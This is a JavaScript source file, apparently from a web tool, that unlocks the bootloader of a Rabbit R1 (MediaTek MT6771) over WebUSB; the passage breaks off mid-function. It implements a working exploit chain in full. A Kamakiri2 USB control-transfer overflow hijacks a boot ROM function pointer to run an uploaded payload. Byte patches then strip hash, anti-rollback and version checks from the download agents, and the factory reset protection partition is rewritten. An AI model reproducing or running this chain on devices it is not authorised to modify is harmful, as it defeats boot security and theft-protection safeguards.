/**
 * MTK Bootloader Unlock for Rabbit R1 (MT6771 / hw_code 0x788)
 *
 * Ported from mtkclient (https://github.com/bkerler/mtkclient) and
 * r1_escape (https://github.com/AgentFabulous/mtkclient) for WebUSB.
 *
 * Flow:
 *   1. Connect to MTK BROM device via WebUSB
 *   2. BROM handshake (sync bytes 0xA0/0x0A/0x50/0x05)
 *   3. Chip detection (GET_HW_CODE → 0x788)
 *   4. Kamakiri2 exploit (CDC SET_LINE_CODING overflow → arbitrary SRAM R/W)
 *   5. Upload BROM patcher payload → patches blacklist, disables SLA/DAA
 *   6. Upload DA1 via SEND_DA + JUMP_DA
 *   7. XFlash handshake with DA1
 *   8. Upload DA2 via boot_to
 *   9. Read GPT → find FRP partition
 *  10. Read FRP, set last byte to 0x01 if 0x00
 *  11. Write modified FRP back
 *  12. Reboot to fastboot via XFlash SHUTDOWN(mode=2)
 *  13. User proceeds with fastboot flashing unlock
 */

// ─── Constants ──────────────────────────────────────────────────────────────────

const MTK_VID = 0x0e8d;
const MTK_PIDS = [0x0003, 0x2000, 0x2001, 0x20ff, 0x3000, 0x6000];
const CDC_DATA_CLASS = 0x0a;

// MT6771 chip config (from brom_config.py hwconfig[0x788])
const CHIP = {
  hw_code: 0x0788,
  name: "MT6771",
  watchdog: 0x10007000,
  uart: 0x11002000,
  brom_payload_addr: 0x100a00,
  da_payload_addr: 0x201000,
  blacklist: [
    [0x00102834, 0x0],
    [0x00106a60, 0x0],
  ],
  send_ptr: [0x102878, 0xdebc],
  brom_register_access: [0xe2d0, 0xe388],
  da1_addr: 0x00200000,
  da2_addr: 0x40000000,
  da1_sig_len: 0x100,
  da2_sig_len: 0x100,
};

// BROM commands (big-endian echo protocol)
const CMD = {
  GET_HW_CODE: 0xfd,
  GET_HW_SW_VER: 0xfc,
  GET_BL_VER: 0xfe,
  GET_VERSION: 0xff,
  GET_TARGET_CONFIG: 0xd8,
  GET_ME_ID: 0xe1,
  GET_SOC_ID: 0xe7,
  READ32: 0xd1,
  WRITE32: 0xd4,
  SEND_DA: 0xd7,
  JUMP_DA: 0xd5,
  BROM_REGISTER_ACCESS: 0xda,
};

// XFlash protocol constants
const XFLASH_MAGIC = 0xfeeeeeef;
const XFLASH = {
  READ_DATA: 0x010005,
  WRITE_DATA: 0x010004,
  SHUTDOWN: 0x010007,
  FORMAT: 0x010003,
  DEVICE_CTRL: 0x010009,
  BOOT_TO: 0x010008,
};
const DT_PROTOCOL_FLOW = 1;

// ─── Helpers ────────────────────────────────────────────────────────────────────

function report(cb, phase, step, progress) {
  if (typeof cb === "function") cb({ phase, step, progress });
}

function delay(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

function packBE32(v) {
  const b = new Uint8Array(4);
  new DataView(b.buffer).setUint32(0, v >>> 0, false);
  return b;
}

function packLE32(v) {
  const b = new Uint8Array(4);
  new DataView(b.buffer).setUint32(0, v >>> 0, true);
  return b;
}

function packLE64(v) {
  const b = new Uint8Array(8);
  const dv = new DataView(b.buffer);
  dv.setUint32(0, v & 0xffffffff, true);
  dv.setUint32(4, Math.floor(v / 0x100000000) & 0xffffffff, true);
  return b;
}

function unpackBE16(buf, off = 0) {
  return new DataView(buf.buffer, buf.byteOffset).getUint16(off, false);
}

function unpackBE32(buf, off = 0) {
  return new DataView(buf.buffer, buf.byteOffset).getUint32(off, false);
}

function unpackLE16(buf, off = 0) {
  return new DataView(buf.buffer, buf.byteOffset).getUint16(off, true);
}

function unpackLE32(buf, off = 0) {
  return new DataView(buf.buffer, buf.byteOffset).getUint32(off, true);
}

function unpackLE64(buf, off = 0) {
  const dv = new DataView(buf.buffer, buf.byteOffset);
  const lo = dv.getUint32(off, true);
  const hi = dv.getUint32(off + 4, true);
  return lo + hi * 0x100000000;
}

function concatU8(...arrays) {
  const total = arrays.reduce((s, a) => s.length ? s + a.length : a.length, 0);
  const out = new Uint8Array(total);
  let off = 0;
  for (const a of arrays) {
    const u = a instanceof Uint8Array ? a : new Uint8Array(a);
    out.set(u, off);
    off += u.length;
  }
  return out;
}

function utf16leToStr(buf) {
  let s = "";
  for (let i = 0; i + 1 < buf.length; i += 2) {
    const c = buf[i] | (buf[i + 1] << 8);
    if (c === 0) break;
    s += String.fromCharCode(c);
  }
  return s;
}

function checksumU16(data) {
  let cs = 0;
  for (let i = 0; i < data.length; i += 2) {
    cs += i + 1 < data.length ? (data[i] | (data[i + 1] << 8)) : data[i];
  }
  return cs & 0xffff;
}

function getPlatform() {
  const ua = navigator.userAgent.toLowerCase();
  if (ua.includes("linux") && !ua.includes("android")) return "linux";
  if (ua.includes("mac")) return "macos";
  if (ua.includes("win")) return "windows";
  return "unknown";
}

function getClaimErrorHelp() {
  const p = getPlatform();
  const lines = [
    "A system driver is holding the USB interface, preventing Chrome from accessing it.",
  ];
  if (p === "linux") {
    lines.push(
      "",
      "Linux fix — Run these commands, then refresh & retry:",
      "",
      '  echo \'SUBSYSTEM=="usb", ATTR{idVendor}=="0e8d", MODE="0666", GROUP="plugdev"\' \\',
      "    | sudo tee /etc/udev/rules.d/51-mediatek.rules",
      "  sudo udevadm control --reload-rules && sudo udevadm trigger",
      "",
      "If already connected, unbind the kernel driver:",
      '  for f in /sys/bus/usb/drivers/cdc_acm/*/; do echo "$(basename $f)" \\',
      "    | sudo tee /sys/bus/usb/drivers/cdc_acm/unbind 2>/dev/null; done"
    );
  } else if (p === "macos") {
    lines.push(
      "",
      "macOS fix — Unload the CDC driver before plugging in:",
      "",
      "  sudo kextunload -b com.apple.driver.usb.cdc.acm",
      "",
      "If that doesn't work (SIP enabled), try:",
      "  sudo kextutil -b com.apple.driver.usb.cdc.acm -R",
      "",
      "Also close serial terminal apps (CoolTerm, screen, etc.).",
      "On macOS 13+: System Settings → Privacy & Security → USB → allow Chrome"
    );
  } else if (p === "windows") {
    lines.push(
      "",
      "Windows fix:",
      "  1. Close SP Flash Tool / MTKClient / serial terminals",
      "  2. Download Zadig: https://zadig.akeo.ie/",
      "  3. Options → List All Devices → select MediaTek device",
      "  4. Set driver to WinUSB → Replace Driver",
      "  5. Refresh this page and retry"
    );
  }
  return lines.join("\n");
}

// ─── Payload Fetching ───────────────────────────────────────────────────────────

async function fetchBinary(url) {
  const resp = await fetch(url);
  if (!resp.ok) throw new Error(`Failed to fetch ${url}: ${resp.status}`);
  return new Uint8Array(await resp.arrayBuffer());
}

// ─── USB Transport ──────────────────────────────────────────────────────────────

class MTKTransport {
  constructor(device) {
    this.device = device;
    this.epIn = 1;
    this.epOut = 1;
    this.ctrlIfNum = -1;
    this.dataIfNum = -1;
    this.maxPacket = 64;
    this.linecode = null;
  }

  async connect() {
    await this.device.open();

    if (!this.device.configuration) {
      await this.device.selectConfiguration(1);
    }

    // Enumerate: find CDC Control (class 0x02) and CDC Data (class 0x0A)
    const config = this.device.configuration;
    for (const iface of config.interfaces) {
      const alt = iface.alternates[0];
      if (alt.interfaceClass === 0x02 && this.ctrlIfNum === -1) {
        this.ctrlIfNum = iface.interfaceNumber;
      }
      if (alt.interfaceClass === CDC_DATA_CLASS && this.dataIfNum === -1) {
        this.dataIfNum = iface.interfaceNumber;
        for (const ep of alt.endpoints) {
          if (ep.type === "bulk" && ep.direction === "in") {
            this.epIn = ep.endpointNumber;
            this.maxPacket = ep.packetSize;
          }
          if (ep.type === "bulk" && ep.direction === "out") {
            this.epOut = ep.endpointNumber;
          }
        }
      }
    }

    // Fallback: if no separate interfaces found, try interface 0 for everything
    if (this.dataIfNum === -1) {
      this.dataIfNum = 0;
      // Try to find endpoints on interface 0
      const iface0 = config.interfaces.find((i) => i.interfaceNumber === 0);
      if (iface0) {
        for (const ep of iface0.alternates[0].endpoints) {
          if (ep.type === "bulk" && ep.direction === "in") this.epIn = ep.endpointNumber;
          if (ep.type === "bulk" && ep.direction === "out") this.epOut = ep.endpointNumber;
        }
      }
    }
    if (this.ctrlIfNum === -1) this.ctrlIfNum = 0;

    console.log(`[MTK] Interfaces: ctrl=${this.ctrlIfNum} data=${this.dataIfNum} epIn=${this.epIn} epOut=${this.epOut} maxPkt=${this.maxPacket}`);

    // Claim interfaces with retry
    const toClaimSet = new Set([this.ctrlIfNum, this.dataIfNum]);
    for (const ifNum of toClaimSet) {
      let ok = false;
      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          await this.device.claimInterface(ifNum);
          ok = true;
          break;
        } catch (e) {
          if (attempt < 3) {
            await delay(500 * attempt);
            try { await this.device.reset(); } catch {}
            await delay(300);
          }
        }
      }
      if (!ok) {
        await this.device.close().catch(() => {});
        throw new Error(
          `Cannot claim USB interface ${ifNum} — a system driver is blocking access.\n\n${getClaimErrorHelp()}`
        );
      }
    }
  }

  async close() {
    try { await this.device.close(); } catch {}
  }

  // ── Bulk transfers ──

  async write(data) {
    if (!(data instanceof Uint8Array)) data = new Uint8Array(data);
    if (data.length === 0) {
      // Send ZLP
      await this.device.transferOut(this.epOut, new Uint8Array(0));
      return;
    }
    let offset = 0;
    while (offset < data.length) {
      const end = Math.min(offset + this.maxPacket, data.length);
      const chunk = data.subarray(offset, end);
      await this.device.transferOut(this.epOut, chunk);
      offset = end;
    }
  }

  async read(length, timeout = 2000) {
    const chunks = [];
    let remaining = length;
    const deadline = Date.now() + timeout;
    while (remaining > 0) {
      if (Date.now() > deadline) {
        throw new Error(`USB read timeout (wanted ${length}, got ${length - remaining} bytes)`);
      }
      try {
        const xfer = await this.device.transferIn(this.epIn, Math.min(remaining, this.maxPacket));
        if (xfer.data && xfer.data.byteLength > 0) {
          const chunk = new Uint8Array(xfer.data.buffer, xfer.data.byteOffset, xfer.data.byteLength);
          chunks.push(chunk);
          remaining -= chunk.length;
        }
      } catch (e) {
        if (Date.now() > deadline) throw e;
        await delay(10);
      }
    }
    if (chunks.length === 1) return chunks[0];
    return concatU8(...chunks);
  }

  // ── USB control transfers (for kamakiri2) ──

  async ctrlIn(requestType, recipient, request, value, index, length) {
    const result = await this.device.controlTransferIn(
      { requestType, recipient, request, value, index },
      length
    );
    if (result.data) {
      return new Uint8Array(result.data.buffer, result.data.byteOffset, result.data.byteLength);
    }
    return new Uint8Array(0);
  }

  async ctrlOut(requestType, recipient, request, value, index, data) {
    await this.device.controlTransferOut(
      { requestType, recipient, request, value, index },
      data
    );
  }
}

// ─── BROM Protocol ──────────────────────────────────────────────────────────────

class BROMProtocol {
  constructor(transport) {
    this.t = transport;
  }

  async echoByte(val) {
    await this.t.write(new Uint8Array([val]));
    const resp = await this.t.read(1);
    return resp[0];
  }

  async echo(data) {
    if (typeof data === "number") data = packBE32(data);
    if (!(data instanceof Uint8Array)) data = new Uint8Array(data);
    await this.t.write(data);
    const resp = await this.t.read(data.length);
    for (let i = 0; i < data.length; i++) {
      if (resp[i] !== data[i]) {
        throw new Error(`Echo mismatch at ${i}: sent 0x${data[i].toString(16)}, got 0x${resp[i].toString(16)}`);
      }
    }
    return resp;
  }

  async rword() {
    const d = await this.t.read(2);
    return unpackLE16(d);
  }

  async rdword() {
    const d = await this.t.read(4);
    return unpackBE32(d);
  }

  // ── Handshake ──

  async handshake() {
    const seq = [
      { send: 0xa0, expect: 0x5f },
      { send: 0x0a, expect: 0xf5 },
      { send: 0x50, expect: 0xaf },
      { send: 0x05, expect: 0xfa },
    ];
    let retries = 0;
    let i = 0;
    while (i < seq.length) {
      await this.t.write(new Uint8Array([seq[i].send]));
      try {
        const resp = await this.t.read(1, 500);
        if (resp[0] === seq[i].expect) {
          i++;
        } else {
          i = 0;
          retries++;
          if (retries > 50) throw new Error("BROM handshake failed after 50 retries");
          await delay(100);
        }
      } catch {
        i = 0;
        retries++;
        if (retries > 50) throw new Error("BROM handshake timeout");
        await delay(300);
      }
    }
  }

  // ── BROM Commands ──

  async getHwCode() {
    await this.echo(new Uint8Array([CMD.GET_HW_CODE]));
    const data = await this.t.read(4);
    return { hwCode: unpackBE16(data, 0), hwVer: unpackBE16(data, 2) };
  }

  async getTargetConfig() {
    await this.echo(new Uint8Array([CMD.GET_TARGET_CONFIG]));
    const data = await this.t.read(4);
    const val = unpackBE32(data);
    const status = await this.rword();
    return {
      sbc: !!(val & 1), sla: !!(val & 2), daa: !!(val & 4),
      raw: val, status,
    };
  }

  async getBlVer() {
    try {
      const echo = await this.echoByte(CMD.GET_BL_VER);
      if (echo === CMD.GET_BL_VER) {
        const data = await this.t.read(1);
        return { inBrom: true, ver: data[0] };
      }
      return { inBrom: false, ver: echo };
    } catch {
      return { inBrom: true, ver: 0 };
    }
  }

  async disableWatchdog() {
    await this.write32(CHIP.watchdog, 0x22000064);
  }

  async read32(addr, count = 1) {
    await this.echo(new Uint8Array([CMD.READ32]));
    await this.echo(packBE32(addr));
    await this.echo(packBE32(count));
    const status = await this.rword();
    if (status !== 0) throw new Error(`READ32 status=${status}`);
    const values = [];
    for (let i = 0; i < count; i++) {
      values.push(unpackBE32(await this.t.read(4)));
    }
    const status2 = await this.rword();
    return count === 1 ? values[0] : values;
  }

  async write32(addr, value) {
    await this.echo(new Uint8Array([CMD.WRITE32]));
    await this.echo(packBE32(addr));
    await this.echo(packBE32(1));
    const status = await this.rword();
    if (status !== 0) throw new Error(`WRITE32 status=${status}`);
    await this.echo(packBE32(value));
    await this.rword();
  }

  async bromRegisterAccess(address, length, data = null, checkResult = true) {
    const mode = data === null ? 0 : 1;
    await this.echo(new Uint8Array([CMD.BROM_REGISTER_ACCESS]));
    await this.echo(packBE32(mode));
    await this.echo(packBE32(address));
    await this.echo(packBE32(length));
    const status = await this.rword();
    if (status !== 0) throw new Error(`BROM_REG_ACCESS status=${status}`);

    let result = null;
    if (mode === 0) {
      result = await this.t.read(length);
    } else {
      await this.t.write(data.slice(0, length));
    }

    if (checkResult) {
      await this.rword();
    }
    return result;
  }

  async sendDa(address, data, sigLen) {
    await this.echo(new Uint8Array([CMD.SEND_DA]));
    await this.echo(packBE32(address));
    await this.echo(packBE32(data.length));
    await this.echo(packBE32(sigLen));
    const status = await this.rword();
    if (status !== 0) throw new Error(`SEND_DA status=${status}`);

    // Upload in chunks
    const chunkSize = 4096;
    for (let off = 0; off < data.length; off += chunkSize) {
      const chunk = data.subarray(off, Math.min(off + chunkSize, data.length));
      await this.t.write(chunk);
    }

    // Flush
    try { await this.t.write(new Uint8Array(0)); } catch {}

    const devCs = await this.rword();
    const status2 = await this.rword();
    if (status2 !== 0) throw new Error(`SEND_DA final status=${status2}`);
  }

  async jumpDa(address) {
    await this.echo(new Uint8Array([CMD.JUMP_DA]));
    await this.t.write(packBE32(address));
    const resAddr = await this.rdword();
    const status = await this.rword();
    if (status !== 0) throw new Error(`JUMP_DA status=${status}`);
    return resAddr;
  }
}

// ─── Kamakiri2 Exploit ──────────────────────────────────────────────────────────

class Kamakiri2 {
  constructor(transport, brom) {
    this.t = transport;
    this.brom = brom;
    this.linecode = null;
  }

  // Core overflow primitive
  async kamakiri2(addr) {
    if (this.linecode === null) {
      try {
        const lc = await this.t.ctrlIn("class", "interface", 0x21, 0, this.t.ctrlIfNum, 7);
        this.linecode = concatU8(lc, new Uint8Array([0]));
      } catch {
        this.linecode = new Uint8Array(8);
      }
    }

    // SET_LINE_CODING overflow: 8 bytes linecode + 4 bytes address = 12 bytes
    const overflow = concatU8(this.linecode, packLE32(addr));
    await this.t.ctrlOut("class", "interface", 0x20, 0, this.t.ctrlIfNum, overflow);

    // Trigger via GET_DESCRIPTOR
    try {
      await this.t.ctrlIn("standard", "device", 0x06, 0x02ff, 0, 9);
    } catch {
      // expected to fail sometimes
    }
  }

  async daReadWrite(address, length, data = null, checkResult = true) {
    await this.brom.bromRegisterAccess(0, 1);
    await this.brom.read32(CHIP.watchdog + 0x50);

    const ptrDa = CHIP.brom_register_access[1]; // 0xe388

    for (let i = 0; i < 3; i++) {
      await this.kamakiri2(ptrDa + 8 - 3 + i);
    }

    if (address < 0x40) {
      for (let i = 0; i < 4; i++) {
        await this.kamakiri2(ptrDa - 6 + (4 - i));
      }
      return await this.brom.bromRegisterAccess(address, length, data, checkResult);
    } else {
      for (let i = 0; i < 3; i++) {
        await this.kamakiri2(ptrDa - 5 + (3 - i));
      }
      return await this.brom.bromRegisterAccess(address - 0x40, length, data, checkResult);
    }
  }

  async daRead(address, length, checkResult = true) {
    return await this.daReadWrite(address, length, null, checkResult);
  }

  async daWrite(address, length, data, checkResult = true) {
    return await this.daReadWrite(address, length, data, checkResult);
  }

  async daRead32(address) {
    const data = await this.daRead(address, 4);
    return unpackLE32(data);
  }

  async exploit(payload, payloadAddr) {
    payloadAddr = payloadAddr || CHIP.brom_payload_addr;

    // Read send_ptr to find the function pointer to hijack
    const sendPtrAddr = CHIP.send_ptr[1]; // 0xdebc
    const ptrSendData = await this.daRead(sendPtrAddr, 4);
    const ptrSend = unpackLE32(ptrSendData) + 8;

    // Write payload to SRAM
    await this.daWrite(payloadAddr, payload.length, payload);

    // Overwrite function pointer → jump to payload
    await this.daWrite(ptrSend, 4, packLE32(payloadAddr), false);
  }

  async verifyExploit() {
    const ack = await this.t.read(4, 5000);
    const val = unpackLE32(ack);
    if (val !== 0xa1a2a3a4) {
      throw new Error(`Exploit ACK mismatch: expected 0xA1A2A3A4, got 0x${val.toString(16)}`);
    }
    return true;
  }
}

// ─── DA Security Patching ───────────────────────────────────────────────────────

function patchDaSecurity(da) {
  const data = new Uint8Array(da);

  function findReplace(searchHex, replaceHex) {
    const s = new Uint8Array(searchHex.match(/.{2}/g).map((h) => parseInt(h, 16)));
    const r = new Uint8Array(replaceHex.match(/.{2}/g).map((h) => parseInt(h, 16)));
    for (let i = 0; i <= data.length - s.length; i++) {
      let match = true;
      for (let j = 0; j < s.length; j++) {
        if (data[i + j] !== s[j]) { match = false; break; }
      }
      if (match) {
        for (let j = 0; j < r.length; j++) data[i + j] = r[j];
        return true;
      }
    }
    return false;
  }

  // From mtkclient patch_preloader_security:
  // RAM blacklist bypass
  findReplace("10b50c68", "10b50120");
  // DA version check → return 0
  findReplace("1fb5002301a8", "00207047002301a8");
  // is_security_enabled → 0 (multiple locations)
  const zeros4 = new Uint8Array(4);
  // Hash check C0070004 → 0
  for (let i = 0; i <= data.length - 4; i++) {
    if (data[i] === 0x04 && data[i+1] === 0x00 && data[i+2] === 0x07 && data[i+3] === 0xc0) {
      data.set(zeros4, i);
    }
  }
  // Anti-rollback C0020053 → 0
  for (let i = 0; i <= data.length - 4; i++) {
    if (data[i] === 0x53 && data[i+1] === 0x00 && data[i+2] === 0x02 && data[i+3] === 0xc0) {
      data.set(zeros4, i);
    }
  }

  return data;
}

// ─── XFlash Protocol ────────────────────────────────────────────────────────────

class XFlashProtocol {
  constructor(transport) {
    this.t = transport;
  }

  async sendCommand(cmd) {
    const pkt = new Uint8Array(12);
    const dv = new DataView(pkt.buffer);
    dv.setUint32(0, XFLASH_MAGIC, true);
    dv.setUint32(4, DT_PROTOCOL_FLOW, true);
    dv.setUint32(8, 4, true);
    await this.t.write(pkt);
    await this.t.write(packLE32(cmd));
  }

  async sendParam(data) {
    const hdr = new Uint8Array(12);
    const dv = new DataView(hdr.buffer);
    dv.setUint32(0, XFLASH_MAGIC, true);
    dv.setUint32(4, DT_PROTOCOL_FLOW, true);
    dv.setUint32(8, data.length, true);
    await this.t.write(concatU8(hdr, data));
  }

  async sendAck() {
    const pkt = new Uint8Array(16);
    const dv = new DataView(pkt.buffer);
    dv.setUint32(0, XFLASH_MAGIC, true);
    dv.setUint32(4, DT_PROTOCOL_FLOW, true);
    dv.setUint32(8, 4, true);
    dv.setUint32(12, 0, true);
    await this.t.write(pkt);
  }

  async recvPacket(timeout = 10000) {
    const hdr = await this.t.read(12, timeout);
    const dv = new DataView(hdr.buffer, hdr.byteOffset);
    const magic = dv.getUint32(0, true);
    const dtype = dv.getUint32(4, true);
    const len = dv.getUint32(8, true);
    if (magic !== XFLASH_MAGIC) {
      throw new Error(`XFlash bad magic: 0x${magic.toString(16)}`);
    }
    const data = len > 0 ? await this.t.read(len, timeout) : new Uint8Array(0);
    return { dtype, data };
  }

  async recvStatus(timeout = 10000) {
    const pkt = await this.recvPacket(timeout);
    return pkt.data.length >= 4 ? unpackLE32(pkt.data) : (pkt.data.length > 0 ? pkt.data[0] : 0);
  }

  // ── DA1 Handshake ──

  async da1Handshake() {
    // Wait for 0xC0 sync
    let syncOk = false;
    for (let i = 0; i < 30; i++) {
      try {
        const rx = await this.t.read(1, 1000);
        if (rx[0] === 0xc0) { syncOk = true; break; }
      } catch {
        await delay(200);
      }
    }
    if (!syncOk) throw new Error("DA1 sync timeout — no 0xC0 received");

    await this.t.write(new Uint8Array([0xc0]));

    // XFlash magic exchange
    const magic = unpackLE32(await this.t.read(4, 5000));
    if (magic !== XFLASH_MAGIC) throw new Error(`DA1 magic mismatch: 0x${magic.toString(16)}`);
    await this.t.write(packLE32(XFLASH_MAGIC));

    // Protocol version
    const ver = await this.t.read(4, 5000);
    await this.t.write(ver); // echo back same version

    return true;
  }

  // ── Boot DA2 ──

  async bootTo(addr, data) {
    await this.sendCommand(XFLASH.BOOT_TO);
    let status = await this.recvStatus();
    if (status !== 0) throw new Error(`BOOT_TO cmd rejected: ${status}`);

    const params = concatU8(packLE64(addr), packLE64(data.length));
    await this.sendParam(params);

    status = await this.recvStatus();
    if (status !== 0) throw new Error(`BOOT_TO params rejected: ${status}`);

    await this.sendParam(data);

    status = await this.recvStatus(30000); // DA2 boot can take time
    if (status !== 0) throw new Error(`BOOT_TO data rejected: ${status}`);
  }

  // ── DA2 Handshake ──

  async da2Handshake() {
    // DA2 may send storage info — try to read it
    try {
      await this.recvPacket(5000);
    } catch {
      // Not all DAs send this
    }
    return true;
  }

  // ── Partition Operations ──

  async readPartition(addr, size, storage = 1, parttype = 8) {
    await this.sendCommand(XFLASH.READ_DATA);
    let status = await this.recvStatus();
    if (status !== 0) throw new Error(`READ_DATA rejected: ${status}`);

    const params = concatU8(
      packLE32(storage), packLE32(parttype),
      packLE64(addr), packLE64(size),
      new Uint8Array(32) // NandExtension zeros
    );
    await this.sendParam(params);

    status = await this.recvStatus();
    if (status !== 0) throw new Error(`READ_DATA params rejected: ${status}`);
    status = await this.recvStatus();
    if (status !== 0) throw new Error(`READ_DATA start rejected: ${status}`);

    const result = [];
    let bytesRead = 0;
    while (bytesRead < size) {
      const pkt = await this.recvPacket(15000);
      if (pkt.data.length <= 4) break; // final status
      result.push(pkt.data);
      bytesRead += pkt.data.length;
      await this.sendAck();
    }

    return concatU8(...result);
  }

  async writePartition(addr, data, storage = 1, parttype = 8) {
    await this.sendCommand(XFLASH.WRITE_DATA);
    let status = await this.recvStatus();
    if (status !== 0) throw new Error(`WRITE_DATA rejected: ${status}`);

    const params = concatU8(
      packLE32(storage), packLE32(parttype),
      packLE64(addr), packLE64(data.length),
      new Uint8Array(32)
    );
    await this.sendParam(params);

    status = await this.recvStatus();
    if (status !== 0) throw new Error(`WRITE_DATA params rejected: ${status}`);

    const chunkSize = 0x40000;
    for (let off = 0; off < data.length; off += chunkSize) {
      const chunk = data.subarray(off, Math.min(off + chunkSize, data.length));
      const cs = checksumU16(chunk);
      const payload = concatU8(packLE32(0), packLE32(cs), chunk);
      await this.sendParam(payload);
    }

    status = await this.recvStatus(15000);
    if (status !== 0) throw new Error(`WRITE_DATA final: ${status}`);
  }

  async shutdown(bootmode = 2) {
    await this.sendCommand(XFLASH.SHUTDOWN);
    let status = await this.recvStatus();
    if (status !== 0) throw new Error(`SHUTDOWN rejected: ${status}`);

    const params = concatU8(
      packLE32(1), // has flags
      packLE32(0), // wdt
      packLE32(0), // async
      packLE32(bootmode), // 0=off, 1=home, 2=fastboot
      packLE32(0), packLE32(0), packLE32(0), packLE32(0)
    );
    await this.sendParam(params);

    status = await this.recvStatus();
    return status === 0;
  }
}

// ─── GPT Parser ─────────────────────────────────────────────────────────────────

function parseGpt(data, sectorSize = 512) {
  const sig = [0x45, 0x46, 0x49, 0x20, 0x50, 0x41, 0x52, 0x54]; // "EFI PART"
  let gptOff = -1;
  for (const tryOff of [sectorSize, 512, 4096]) {
    let match = true;
    for (let i = 0; i < 8; i++) {
      if (data[tryOff + i] !== sig[i]) { match = false; break; }
    }
    if (match) { gptOff = tryOff; sectorSize = tryOff; break; }
  }
  if (gptOff < 0) throw new Error("GPT signature not found");

  const dv = new DataView(data.buffer, data.byteOffset);
  const numEntries = dv.getUint32(gptOff + 80, true);
  const entrySize = dv.getUint32(gptOff + 84, true);
  const entriesLba = unpackLE64(data, gptOff + 72);
  const entriesOff = entriesLba * sectorSize;

  const partitions = [];
  for (let i = 0; i < numEntries; i++) {
    const eOff = entriesOff + i * entrySize;
    if (eOff + entrySize > data.length) break;

    let empty = true;
    for (let j = 0; j < 16; j++) {
      if (data[eOff + j] !== 0) { empty = false; break; }
    }
    if (empty) continue;

    const firstLba = unpackLE64(data, eOff + 32);
    const lastLba = unpackLE64(data, eOff + 40);
    const name = utf16leToStr(data.subarray(eOff + 56, eOff + 56 + 72));

    partitions.push({ name, firstLba, lastLba, sectors: lastLba - firstLba + 1, sizeBytes: (lastLba - firstLba + 1) * sectorSize });
  }
  return partitions;
}

// ─── Main Orchestrator ──────────────────────────────────────────────────────────

export async function unlockBootloaderWebUSB(onProgress) {
  if (!navigator.usb) {
    throw new Error("WebUSB not supported. Use Chrome or Edge 61+.");
  }

  let transport = null;

  try {
    // ── Stage 0: Connect ──
    report(onProgress, "Connect", "Select your R1 in the browser prompt", 0.02);

    const filters = MTK_PIDS.map((pid) => ({ vendorId: MTK_VID, productId: pid }));
    const device = await navigator.usb.requestDevice({ filters });

    report(onProgress, "Connect", `Selected: ${device.productName || "MediaTek device"}`, 0.05);

    transport = new MTKTransport(device);
    await transport.connect();
    report(onProgress, "Connect", "USB interfaces claimed", 0.08);

    const brom = new BROMProtocol(transport);

    // ── Stage 1: Handshake ──
    report(onProgress, "Handshake", "BROM sync...", 0.10);
    await brom.handshake();
    report(onProgress, "Handshake", "Sync OK ✓", 0.13);

    // ── Stage 2: Chip Detection ──
    report(onProgress, "Detect", "Reading chip info...", 0.15);
    const { hwCode } = await brom.getHwCode();
    report(onProgress, "Detect", `Chip: 0x${hwCode.toString(16)} ${hwCode === CHIP.hw_code ? "(MT6771 — R1)" : "(unexpected)"}`, 0.17);

    await brom.disableWatchdog();
    const config = await brom.getTargetConfig();
    report(onProgress, "Detect", `Security: SBC=${config.sbc} SLA=${config.sla} DAA=${config.daa}`, 0.19);

    const blVer = await brom.getBlVer();
    report(onProgress, "Detect", `${blVer.inBrom ? "BROM" : "Preloader"} mode`, 0.20);

    // ── Stage 3: Kamakiri2 Exploit ──
    report(onProgress, "Exploit", "Loading exploit payload...", 0.22);
    const payload = await fetchBinary("/payloads/mtk/mt6771_payload.bin");
    report(onProgress, "Exploit", `Payload: ${payload.length} bytes`, 0.25);

    report(onProgress, "Exploit", "Running kamakiri2 exploit (CDC overflow)...", 0.27);
    const k2 = new Kamakiri2(transport, brom);
    await k2.exploit(payload);

    report(onProgress, "Exploit", "Waiting for exploit ACK...", 0.32);
    await k2.verifyExploit();
    report(onProgress, "Exploit", "BROM patched — security bypassed ✓", 0.35);

    // Re-handshake with patched BROM
    report(onProgress, "Exploit", "Re-syncing...", 0.37);
    await brom.handshake();

    // ── Stage 4: Upload DA1 ──
    report(onProgress, "DA", "Loading DA1...", 0.40);
    let da1 = await fetchBinary("/payloads/mtk/da1_mt6771.bin");
    da1 = patchDaSecurity(da1);
    report(onProgress, "DA", `DA1 patched (${da1.length} bytes), uploading...`, 0.43);

    await brom.sendDa(CHIP.da1_addr, da1, CHIP.da1_sig_len);
    report(onProgress, "DA", "DA1 uploaded, jumping...", 0.48);
    await brom.jumpDa(CHIP.da1_addr);

    // ── Stage 5: XFlash Handshake ──
    report(onProgress, "DA", "Waiting for DA1...", 0.50);
    const xf = new XFlashProtocol(transport);
    await xf.da1Handshake();
    report(onProgress, "DA", "DA1 active — XFlash protocol ✓", 0.53);

    // ── Stage 6: Upload DA2 ──
    report(onProgress, "DA", "Loading DA2...", 0.55);
    let da2 = await fetchBinary("/payloads/mtk/da2_mt6771.bin");
    da2 = patchDaSecurity(da2);
    report(onProgress, "DA", `DA2 patched (${da2.length} bytes), booting...`, 0.58);

    await xf.bootTo(CHIP.da2_addr, da2);
    report(onProgress, "DA", "DA2 booted ✓", 0.62);

    // DA2 handshake
    await xf.da2Handshake();

    // ── Stage 7: Read GPT ──
    report(onProgress, "FRP", "Reading partition table...", 0.65);
    const sectorSize = 512;
    const gptData = await xf.readPartition(0, 128 * sectorSize, 1, 8);
    const partitions = parseGpt(gptData, sectorSize);

    const partNames = partitions.map((p) => p.name);
    console.log("[MTK] Partitions:", partNames.join(", "));

    const frp = partitions.find((p) => p.name.toLowerCase() === "frp");
    if (!frp) {
      throw new Error("FRP partition not found!\nPartitions: " + partNames.join(", "));
    }
    report(onProgress, "FRP", `FRP: LBA ${frp.firstLba}, ${frp.sizeBytes} bytes`, 0.70);

    // ── Stage 8: Read FRP ──
    report(onProgress, "FRP", "Reading FRP...", 0.73);
    const frpAddr = frp.firstLba * sectorSize;
    const frpData = await xf.readPartition(frpAddr, frp.sizeBytes, 1, 8);
    report(onProgress, "FRP", `FRP read: ${frpData.length} bytes`, 0.77);

    // ── Stage 9: Modify FRP ──
    const lastByte = frpData[frpData.length - 1];
    report(onProgress, "FRP", `Last byte: 0x${lastByte.toString(16).padStart(2, "0")}`, 0.78);

    let modified = false;
    if (lastByte === 0x00) {
      frpData[frpData.length - 1] = 0x01;
      modified = true;
      report(onProgress, "FRP", "→ Set to 0x01 (bootloader unlock allowed)", 0.80);
    } else if (lastByte === 0x01) {
      report(onProgress, "FRP", "Already 0x01 — unlock flag already set", 0.80);
    } else {
      frpData[frpData.length - 1] = 0x01;
